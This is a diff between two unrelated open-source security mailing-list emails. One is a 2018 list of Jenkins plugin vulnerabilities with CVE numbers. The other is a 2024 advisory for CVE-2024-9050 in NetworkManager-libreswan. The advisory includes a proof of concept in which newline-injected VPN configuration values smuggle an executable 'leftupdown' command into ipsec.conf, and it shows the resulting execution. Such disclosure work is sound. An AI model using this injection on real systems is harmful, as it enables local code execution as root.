@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3988" "Monday" "25" "June" "2018" "20:21:20" "+0200" "Daniel Beck" "ml@beckweb.net" "<ECE1726C-BB55-4159-9A7F-EA4A0F087CE5@beckweb.net>" "123" "Re: [oss-security] Multiple vulnerabilities in Jenkins plugins" nil nil nil "6" "2018062518:21:20" "[oss-security] Multiple vulnerabilities in Jenkins plugins" (number mark "U       ml@beckweb.n Jun 25  123/3988  " thread-indent "\"Re: [oss-security] Multiple vulnerabilities in Jenkins plugins\"\n") "<E00DE545-C35C-4E5F-8AEF-022602DEB087@beckweb.net>" ("<E00DE545-C35C-4E5F-8AEF-022602DEB087@beckweb.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 9407 invoked by uid 550); 25 Jun 2018 18:21:33 -0000
+Received: (qmail 29930 invoked by uid 550); 25 Oct 2024 01:21:55 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,141 +7,181 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9386 invoked from network); 25 Jun 2018 18:21:32 -0000
-From: Daniel Beck <ml@beckweb.net>
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Date: Mon, 25 Jun 2018 20:21:20 +0200
-References: <E00DE545-C35C-4E5F-8AEF-022602DEB087@beckweb.net>
+x-ms-reactions: disallow
+Received: (qmail 7582 invoked from network); 25 Oct 2024 00:29:09 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1729816141;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type;
+	bh=r5+BJ+xJcdJ4A+92pYdub+nvE9Vn8fC8tFp0JbBG5EQ=;
+	b=QCjp8vCXf1zzYKNUUajo2fQjyXMaXMyd7pgj/e/NHTAqF6OLb0VGEd1Hp26nAkZjuj43cr
+	3ePuTgIP+C/NYaNOmlvEhekZ8ysv8FUP3GzQV5/FaRgOzPd4YZ8vGtyp+vaKLumdB4IlI4
+	ERZg8scci/gdqHRQM/ZfhKJjQv3lL7w=
+X-MC-Unique: E59nkG7lNGyML1BFR8fYzg-1
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1729816140; x=1730420940;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=r5+BJ+xJcdJ4A+92pYdub+nvE9Vn8fC8tFp0JbBG5EQ=;
+        b=eMOYZ8NOgJry4XJUhlbWTHTP+YACTTZxnzqaaTjtHZ0jK0HNtaLIdKlnPayX3MRFCp
+         D4hA05ssdUZ5QU4bZhjrj6rzk1ePUplI3r+yiCu2hr4EBuYqwj470lHMqU7OltbES2TA
+         S10mWVAPWc1JW5ACHzE5O56HVPLK+EUpqvpes5N16BlF4gJx/j7oDoBEgJGAMmU9/44x
+         9cj6T1co0kSqj0qiLJEhKYNppRIRsFygHYJVxQ636i8TRRlLEek5bQOHex2DGtdw5jAh
+         qb4QBBmbmVFmhwcAwgAuEGmIZOEoiObrt06E2JgCM6rWfCZmIJe/MpbyWx+46gTCTnc9
+         Ip0A==
+X-Gm-Message-State: AOJu0YymqkFU5+RPNL8YH+zK8F0vF0gUn18rTZXtTvAmLZz3A822VyvO
+	d5iVoJQgmbecU6LA6Fosvy499yOggimB3wiNBYAfekxQu6MMdqV0skMGYDE6q3E7yZXljWa/KYh
+	uZnaVmA2SbeDTbOYHlELbhRGUFM46fFvgOdi3rHkOcGKtJDoylUbFZTkUvKm6QL7LZqUX1LEwAE
+	5UmShJ3UDnAlZonlbGoWgDLJeuswVf6DSidu2aDtCNi30D/WD8sn8=
+X-Received: by 2002:a05:690c:7649:b0:6e3:2192:e0e6 with SMTP id 00721157ae682-6e858167ee0mr40936447b3.14.1729816139713;
+        Thu, 24 Oct 2024 17:28:59 -0700 (PDT)
+X-Google-Smtp-Source: AGHT+IG3tSQ7QQ6rkgFyNdUhW4KBnATy+DzLuu/91gyUb824LY3uE/LxI4xXuv8PB+1t4cv/SD1DsaJMv0DSJB3y0Tw=
+X-Received: by 2002:a05:690c:7649:b0:6e3:2192:e0e6 with SMTP id
+ 00721157ae682-6e858167ee0mr40936307b3.14.1729816139118; Thu, 24 Oct 2024
+ 17:28:59 -0700 (PDT)
+MIME-Version: 1.0
+From: Lubomir Rintel <lrintel@redhat.com>
+Date: Fri, 25 Oct 2024 02:28:48 +0200
+Message-ID: <CACQFvQHh9Ci5gkJ-a5CuWVQfNcK-TQOHS_ce6ufjjrsyv99xYw@mail.gmail.com>
 To: oss-security@lists.openwall.com
-In-Reply-To: <E00DE545-C35C-4E5F-8AEF-022602DEB087@beckweb.net>
-Message-Id: <ECE1726C-BB55-4159-9A7F-EA4A0F087CE5@beckweb.net>
-X-Mailer: Apple Mail (2.3273)
-X-bounce-key: webpack.hosteurope.de;ml@beckweb.net;1529950892;458c2a73;
-X-HE-SMSGID: 1fXW77-0000E8-70
-Subject: Re: [oss-security] Multiple vulnerabilities in Jenkins plugins
+X-Mimecast-Spam-Score: 0
+X-Mimecast-Originator: redhat.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] CVE-2024-9050: NetworkManager-libreswan IPSec VPN plugin local code execution
 
+Hi,
 
-> On 25. Jun 2018, at 16:10, Daniel Beck <ml@beckweb.net> wrote:
->=20
-> SECURITY-915
-> A form action method in GitHub Plugin did not check the permission of the=
-=20
-> user accessing it, allowing anyone with Overall/Read access to Jenkins to=
-=20
-> cause Jenkins to send a GitHub API request to create an API token to a an=
-=20
-> attacker specified URL.
->=20
-> This allowed users with Overall/Read access to Jenkins to connect to an=20
-> attacker-specified URL using attacker-specified credentials IDs obtained=
-=20
-> through another method, capturing credentials stored in Jenkins.
->=20
-> Additionally, this form validation method did not require POST requests,=
-=20
-> resulting in a CSRF vulnerability.
+We discovered and fixed a security issue in NetworkManager-libreswan,
+where we fail to sanitize the VPN configuration from a local unprivileged
+user and pass it directly to Libreswan upon an attempt to activate a
+connection.
 
-CVE-2018-1000600
+It's fixed in NetworkManager-libreswan.git version 1.2.24, in
+commit dcf8acfb25bd ('all: rework formatting of ipsec.conf') [1]
 
-> SECURITY-440
-> SSH Credentials Plugin allowed the creation of SSH credentials with keys=
-=20
-> "From a file on Jenkins master". Credentials Binding Plugin 1.13 and newe=
-r=20
-> allows binding SSH credentials to environment variables. In combination,=
-=20
-> these two features allow users with the permission to configure a job to=
-=20
-> read arbitrary files on the Jenkins master by creating an SSH credential=
-=20
-> referencing an arbitrary file on the Jenkins master, and binding it to an=
-=20
-> environment variable in a job.
+[1] <https://gitlab.gnome.org/GNOME/NetworkManager-libreswan/-/commit/dcf8acfb25bd31e4b8cbd20c229da660238b5c1b>
 
-CVE-2018-1000601
+The issue is assigned CVE-2024-9050. Details follow.
 
-> SECURITY-916
-> SAML Plugin did not invalidate the previous session and create a new one=
-=20
-> upon successful login, allowing attackers able to control or obtain=20
-> another user=E2=80=99s pre-login session ID to impersonate them.
+------------------------------ 8< ------------------------------
 
-CVE-2018-1000602
+The libreswan connection configuration is simple key=value format, but we
+fail to check for or escape special characters, including newlines, which
+makes it possible for the user to trick us to treat values as key.
 
-> SECURITY-808
-> Openstack Cloud Plugin did not perform permission checks on methods=20
-> implementing form validation. This allowed users with Overall/Read access=
-=20
-> to Jenkins to connect to an attacker-specified URL using attacker-
-> specified credentials IDs obtained through another method, capturing=20
-> credentials stored in Jenkins, and to cause Jenkins to submit HTTP=20
-> requests to attacker-specified URLs.
->=20
-> Additionally, these form validation methods did not require POST requests=
-,=20
-> resulting in a CSRF vulnerability.
+Unfortunately, there's one particular key that takes an executable command
+as an argument: leftupdown (couldn't find more in ipsec.conf(5)). We
+normally use it to specify the NM-libreswan callback, that would pass L3
+configuration back to NM. It can be abused to execute arbitrary program.
 
-CVE-2018-1000603
+Here's how (notice hostaddrfamily has a funny value that spans multiple
+lines, including a leftupdown=/bin/true, which is plays the role of PoC
+exploit payload):
 
-> SECURITY-906
-> Badge Plugin stored and displayed user-provided HTML for badges and=20
-> summaries unprocessed, allowing users with the ability to control badge=20
-> content to store malicious HTML to be displayed within Jenkins.
+  # nmcli -f vpn.data --show-secrets c show is
+  vpn.data: hostaddrfamily = ipv4
+  leftupdown=/bin/true
+  ikev2=never
+  leftxauthclient=yes
+  leftusername=username
+  phase2alg=aes256-sha1
+  authby=secret
+  left=%defaultroute
+  leftmodecfgclient=yes
+  right=172.31.79.2
+  conn ign, leftid = groupname, leftxauthusername = username,
+pskinputmodes = save, pskvalue-flags = 0, right = 172.31.79.2,
+rightsubnet = 10.0.2.0/24, xauthpassword-flags = 0,
+xauthpasswordinputmodes = save
+  # strace -f -p$(pidof pluto) -eexecve &
+  # nmcli c up is &
+  ...
+  strace: Process 103675 attached
+  [pid 103675] execve("/bin/true", ["/bin/true"], 0x558af10a3e80 /* 62
+vars */) = 0
 
-CVE-2018-1000604
+This is how it's serialized in a keyfile:
 
-> SECURITY-941
-> CollabNet Plugin disabled SSL/TLS certificate validation for the entire=20
-> Jenkins master JVM by default.
+  # cat /etc/NetworkManager/system-connections/is.nmconnection
+  [connection]
+  id=is
+  uuid=418b5af9-63c6-4dfa-9d57-ff3dc3e00cfd
+  type=vpn
+  autoconnect=false
+  timestamp=1726676158
 
-CVE-2018-1000605
+  [vpn]
+  leftid=groupname
+  hostaddrfamily=ipv4\n leftupdown=/bin/true\n ikev2=never\n
+leftxauthclient=yes\n leftusername=username\n phase2alg=aes256-sha1\n
+authby=secret\n left=%defaultroute\n leftmodecfgclient=yes\n
+right=172.31.79.2\nconn ign
+  leftxauthusername=username
+  pskinputmodes=save
+  pskvalue-flags=0
+  right=172.31.79.2
+  rightsubnet=10.0.2.0/24
+  xauthpassword-flags=0
+  xauthpasswordinputmodes=save
+  service-type=org.freedesktop.NetworkManager.libreswan
 
-> SECURITY-819
-> A form validation method in URLTrigger Plugin did not check the permissio=
-n=20
-> of the user accessing them, allowing anyone with Overall/Read access to=20
-> Jenkins to cause Jenkins to send a GET request to a specified URL.
->=20
-> Additionally, this form validation method did not require POST requests,=
-=20
-> resulting in a CSRF vulnerability.
+  [vpn-secrets]
+  pskvalue=ipsecretkek
+  xauthpassword=password
 
-CVE-2018-1000606
+  [ipv4]
+  method=auto
 
-> SECURITY-870
-> Fortify CloudScan Plugin did not validate file names in rulepack ZIP=20
-> archives it extracts, resulting in an arbitrary file write vulnerability.
+  [ipv6]
+  addr-gen-mode=stable-privacy
+  method=auto
 
-CVE-2018-1000607
+  [proxy]
 
-> SECURITY-950
-> IBM z/OS Connector Plugin did not encrypt password credentials stored in=
-=20
-> its configuration. This could be used by users with master file system=20
-> access to obtain the password.
->=20
-> While masked from view using a password form field, the AWS Secret Key wa=
-s=20
-> transferred in plain text to administrators when accessing the global=20
-> configuration form.
+This is what gets passed to pluto (libreswan ipsec daemon), with an
+inline comment:
 
-CVE-2018-1000608
+  conn 418b5af9-63c6-4dfa-9d57-ff3dc3e00cfd
+   aggrmode=yes
+   leftid=@groupname
+   hostaddrfamily=ipv4        # Our injected content is here.
+   leftupdown=/bin/true       # This line gets the payload called.
+   ikev2=never                # These lines are there so that
+   leftxauthclient=yes        # the connection is well formed,
+   leftusername=username      # and progresses to the point
+   phase2alg=aes256-sha1      # it calls the script.
+   authby=secret              # The last "conn ign" line
+   left=%defaultroute         # shifts the other settings,
+   leftmodecfgclient=yes      # including the original leftupdown
+   right=172.31.79.2          # into a separate bogus connection,
+  conn ign                    # so that they're effectively ignored.
+   authby=secret
+   left=%defaultroute
+   leftmodecfgclient=yes
+   leftupdown=\"/usr/libexec/nm-libreswan-service-helper 7 103758
+org.freedesktop.NetworkManager.libreswan.Connection_31\"
+   right=172.31.79.2
+   rightmodecfgserver=yes
+   modecfgpull=yes
+   rightsubnet=10.0.2.0/24
+   leftxauthclient=yes
+   leftusername=username
+   remote-peer-type=cisco
+   rightxauthserver=yes
+   ike=aes256-sha1;modp1536
+   phase2alg=aes256-sha1
+   ikelifetime=24h
+   salifetime=24h
+   rekey=yes
+   keyingtries=1
+   ikev2=never
+   nm-configured=yes
+   auto=add
 
-> SECURITY-927
-> Configuration as Code Plugin lacked a permission check in the method=20
-> handling the URL exporting the system configuration. This allows users=20
-> with Overall/Read access to Jenkins to obtain this YAML export.
+I'm not seeing SELinux AVC denials.
 
-CVE-2018-1000609
+------------------------------ 8< ------------------------------
 
-> SECURITY-929
-> Configuration as Code Plugin logged secrets set via its configuration to=
-=20
-> the Jenkins master system log in plain text. This allowed users with=20
-> access to the Jenkins log files to obtain these passwords and similar=20
-> secrets.
-
-CVE-2018-1000610
+Take care,
+Lubo
 
